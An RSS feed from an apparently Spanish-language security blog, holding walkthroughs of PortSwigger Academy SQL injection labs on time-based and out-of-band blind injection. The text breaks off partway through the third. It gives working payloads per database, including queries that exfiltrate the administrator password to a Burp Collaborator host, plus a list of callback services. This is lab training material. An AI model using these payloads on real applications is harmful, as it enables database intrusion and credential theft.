<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>A1ux</title>
        <link>https://www.alux.cc/</link>
        <description>Recent content on A1ux</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>es-GT</language>
        <lastBuildDate>Thu, 11 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 14</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/</link>
        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 14" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-time-delays&#34;&gt;Lab: Blind SQL injection with time delays&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de sql injection pero basandose en tiempo, la cual se utilizara posteriormente para poder extraer los datos del usuario y contrasena de la tabla usuers.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Basandonos en la siguiente &lt;!-- raw HTML omitted --&gt;lista&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt; encontramos que inyectando la siguiente consulta podemos ejecutar un delay, sabiendo que la aplicacion es backend &lt;code&gt;postgresql&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;xxxxxxxxx&#39; AND 1337=(SELECT 1337 FROM PG_SLEEP(10)) AND &#39;1337&#39;=&#39;1337 //inyectar esto no dejara ejecutar conditional time delay
xxxxxxxxx&#39;%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- //%3B para no tener conflicto en repeater al colocar &#39;;&#39; en la cookie
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Podemos inyectar las siguientes consultas para crearla:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Consulta SQL&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &amp;lsquo;a&amp;rsquo;||dbms_pipe.receive_message((&amp;lsquo;a&amp;rsquo;),10) ELSE NULL END FROM dual&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft&lt;/td&gt;
&lt;td&gt;IF (YOUR-CONDITION-HERE) WAITFOR DELAY &amp;lsquo;0:0:10&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;SELECT IF(YOUR-CONDITION-HERE,sleep(10),&amp;lsquo;a&amp;rsquo;)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;Ahora toca crear una consulta para extraer los valores de la contrasena de la tabla &lt;code&gt;users&lt;/code&gt;, creando la siguiente consulta, sabiendo que es &lt;code&gt;postgresql&lt;/code&gt;. Como en los anteriores sabemos que son 20 caracteres en este caso vamos a utilizar la siguiente consulta, utilizando clusterbomb, el primero como valor numero de 1 a 20 y el 2 con una lista de caracteres alfanumericos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%3BSELECT CASE WHEN (username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and substr(password,&amp;lt;valor cambiante 1 a 20&amp;gt;,1)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;valor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alfanumerico&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 235; 
			flex-basis: 565px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder.png&#34; data-size=&#34;1340x569&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder.png&#34;
			width=&#34;1340&#34;
			height=&#34;569&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder_hua3bb1f5623a1881c7205a7d61c173e1d_61681_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/intruder_hua3bb1f5623a1881c7205a7d61c173e1d_61681_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque con intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque con intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto ya tenemos la contrasena del usuario &lt;code&gt;administrator&lt;/code&gt; que es &lt;code&gt;ifp6pjrl8u4oy2xp9e3b&lt;/code&gt;. Y algo a tomar en cuenta es al hacer inyecciones de este tipo, la respuesta de las peticiones al hacerse juntas la respuesta tardara igual en todas, asi que lo justo es no enviar en hilos ya que no sabremos cual sera la respuesta que tarde mas ya que se replicara en varias respuestas.&lt;/p&gt;
&lt;h4 id=&#34;extraer-datos&#34;&gt;Extraer datos&lt;/h4&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 205; 
			flex-basis: 493px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto.png&#34; data-size=&#34;1762x857&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto.png&#34;
			width=&#34;1762&#34;
			height=&#34;857&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto_hu0900f70a950cadf08f43b3a81f97008f_97050_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-14/resuelto_hu0900f70a950cadf08f43b3a81f97008f_97050_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;lista.txt&#34; &gt;Lista de Payloads SQL Injection Time Based&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 15</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/</link>
        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 15" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-out-of-band-interaction&#34;&gt;Lab: Blind SQL injection with out-of-band interaction&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder inyectar una consulta sql y basandonos en la ejecucion que pueda realizar el backend una consulta hacia un endpoint y genere una accion, en este caso de esto se trata. Mas que todo donde los otros tipos de sql injection a ciegas no puede llegar.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Burpsuite cuenta con una propia herramienta que es Burp Collaborator que lo que hace es apoyar a detectar vulnerabilidades a ciegas. Pero si no se cuenta con Burpsuite Pro no se puede utilizar, asi que se listan a continuacion algunas alternativas para poder explotar esta vulnerabilidad.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;En el laboratorio no se puede realizar alguna de estas alternativas ya que el firewall de PortswiggerAcademy bloquea&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://dnslog.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://dnslog.cn/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://webhook.site/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://webhook.site/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://app.interactsh.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://app.interactsh.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://pingb.in/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://pingb.in/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://swin.es/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://swin.es/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://ceye.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://ceye.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://canarytokens.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://canarytokens.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://requestbin.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://requestbin.net/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://beeceptor.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://beeceptor.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;Los payloads a inyectar segun la base de datos son los siguientes:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Consulta&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT extractvalue(xmltype(&#39;\&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;\&amp;lt;!DOCTYPE root [ \&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;quot;&amp;gt; %remote;]&amp;gt;&#39;),&#39;/l&#39;) FROM dual&lt;/code&gt; o &lt;code&gt;SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)&lt;/code&gt; solo con privilegios elevados&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft&lt;/td&gt;
&lt;td&gt;&lt;code&gt;exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)&lt;/code&gt; solo trabaja en windows o &lt;code&gt;SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;explotar&#34;&gt;Explotar&lt;/h4&gt;
&lt;p&gt;Utilizando una de las consultas podemos inyectar una consulta y enviar la consulta, y ahora collaborate nos enviara las peticiones que se han realizado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fxml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENTITY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SYSTEM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http%3a//gcwtmppkxyte3s4zwxzqbfkig9mba0.burpcollaborator.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;+%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)+FROM+dual--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 143; 
			flex-basis: 343px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater.png&#34; data-size=&#34;1539x1075&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater.png&#34;
			width=&#34;1539&#34;
			height=&#34;1075&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater_hu5decb89ea607d037ca51e48705c853ff_151973_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater_hu5decb89ea607d037ca51e48705c853ff_151973_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Envio de consulta con repeater&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Envio de consulta con repeater&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 217; 
			flex-basis: 523px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto.png&#34; data-size=&#34;1761x808&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto.png&#34;
			width=&#34;1761&#34;
			height=&#34;808&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto_hudb1d6fd86e50b409045069c012032baa_103793_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto_hudb1d6fd86e50b409045069c012032baa_103793_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 16</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/</link>
        <pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 16" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft&#34;&gt;Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la contrasena del usuario &amp;lsquo;administrator&amp;rsquo; en la tabla &amp;lsquo;users&amp;rsquo;. Para este caso haciendo uso de la exfiltracion de la propia base de datos para que se conecte a nuestro host y ahi captura lo que es enviado en la url.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero es saber que tipo de payloads podemos usar para ejecutar la consulta que deseamos, y se encuentran las siguientes:&lt;/p&gt;
&lt;hr&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Consulta&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;SELECT extractvalue(xmltype(&#39;&amp;lt;?xml version=&amp;ldquo;1.0&amp;rdquo; encoding=&amp;ldquo;UTF-8&amp;rdquo;?&amp;gt;&amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;ldquo;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;quot;&amp;gt; %remote;]&amp;gt;&#39;),&#39;/l&#39;) FROM dual&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft&lt;/td&gt;
&lt;td&gt;declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&amp;lsquo;master..xp_dirtree &amp;ldquo;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&amp;rdquo;&#39;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into (SELECT YOUR-QUERY-HERE); c := &amp;lsquo;copy (SELECT &amp;lsquo;&#39;&#39;&#39;) to program &amp;lsquo;&amp;lsquo;nslookup &amp;lsquo;||p||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&amp;rsquo;&#39;&#39;;execute c; END; $$ language plpgsql security definer; SELECT f();&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;SELECT YOUR-QUERY-HERE INTO OUTFILE &amp;lsquo;\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&amp;rsquo; &lt;em&gt;solo funciona en windows&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;Ahora toca saber cual es el payload correcto para poder resolver el lab, probando de uno en uno llegamos a cual es el correcto, asi que probaremos con Oracle el cual termino siendo el correcto y evitarnos probar cada uno del resto, la consulta ejecutada fue:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT extractvalue(xmltype(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&amp;gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOCTYPE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ENTITY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SYSTEM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&amp;#39;||(SELECT password from users where username=&amp;#39;administrator&amp;#39;)||&amp;#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) FROM dual--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Claramente este codigo debemos convertirlo en formato URL para que no entre en conflicto con el header que es enviado. Para quedarmente enviado y ejecutado de esta manera.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
